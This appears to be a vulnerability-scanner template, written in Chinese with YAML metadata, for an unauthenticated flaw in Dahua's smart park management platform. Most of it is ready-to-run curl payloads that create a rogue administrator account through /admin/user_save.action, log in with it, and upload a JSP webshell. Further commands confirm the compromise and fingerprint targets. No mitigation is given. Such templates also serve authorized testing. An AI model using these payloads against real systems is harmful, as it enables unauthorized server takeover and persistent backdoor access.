---
id: DAHUA-SMART-PARK-UPLOAD
title: 大华智慧园区综合管理平台 user_save.action 未授权用户创建及文件上传漏洞
product: dahua
vendor: Dahua (大华)
version_affected: "大华智慧园区综合管理平台（受影响版本）"
severity: CRITICAL
tags: [file_upload, auth_bypass, 无需认证, 国产]
fingerprint: ["大华", "Dahua", "智慧园区"]
---

## 漏洞描述

大华智慧园区综合管理平台的 `user_save.action` 接口未进行身份认证校验，攻击者可直接调用该接口创建具有管理员权限的用户。创建管理员账户后可登录后台，进一步利用文件上传功能上传 Webshell，获取服务器控制权限。

## 影响版本

- 大华智慧园区综合管理平台（受影响版本）

## 前置条件

- 无需认证
- 目标 HTTP 端口可访问
- `/admin/user_save.action` 接口可达

## 利用步骤

1. 确认目标为大华智慧园区综合管理平台
2. 通过 `/admin/user_save.action` 接口创建管理员用户，设置 `userBean.roleIds=1` 赋予管理员权限
3. 使用创建的管理员账户登录后台
4. 利用后台文件上传功能上传 Webshell
5. 访问 Webshell 获取服务器控制权限

## Payload

### 创建管理员用户

```bash
curl -X POST "http://target/admin/user_save.action" \
  -H "Content-Type: multipart/form-data" \
  -F "userBean.userType=0" \
  -F "userBean.ownerCode=001" \
  -F "userBean.isReuse=0" \
  -F "userBean.macStat=0" \
  -F "userBean.roleIds=1" \
  -F "userBean.loginName=pwned" \
  -F "displayedOrgName=pwned" \
  -F "userBean.loginPass=pwned123" \
  -F "checkPass=pwned123" \
  -F "userBean.groupId=0" \
  -F "userBean.userName=pwned"
```

### 使用创建的用户登录

```bash
curl -X POST "http://target/admin/login.action" \
  -d "loginName=pwned&loginPass=pwned123" \
  -c cookies.txt
```

### 利用后台文件上传（登录后）

```bash
curl -X POST "http://target/admin/file_upload.action" \
  -b cookies.txt \
  -F "file=@shell.jsp;type=application/octet-stream"
```

## 验证方法

```bash
# 检查用户创建是否成功（响应包含成功标志）
curl -s -X POST "http://target/admin/user_save.action" \
  -F "userBean.userType=0" \
  -F "userBean.ownerCode=001" \
  -F "userBean.isReuse=0" \
  -F "userBean.macStat=0" \
  -F "userBean.roleIds=1" \
  -F "userBean.loginName=pwned" \
  -F "displayedOrgName=pwned" \
  -F "userBean.loginPass=pwned123" \
  -F "checkPass=pwned123" \
  -F "userBean.groupId=0" \
  -F "userBean.userName=pwned" | grep -i "success\|成功\|200"

# 使用创建的用户登录验证
curl -s -X POST "http://target/admin/login.action" \
  -d "loginName=pwned&loginPass=pwned123" \
  -c cookies.txt -o /dev/null -w "%{http_code}"

# 检查登录后能否访问管理后台
curl -s -b cookies.txt "http://target/admin/index.action" | grep -i "admin\|管理\|dashboard"
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "大华\|Dahua\|智慧园区\|综合管理平台"
curl -s -o /dev/null -w "%{http_code}" "http://target/admin/user_save.action"
```
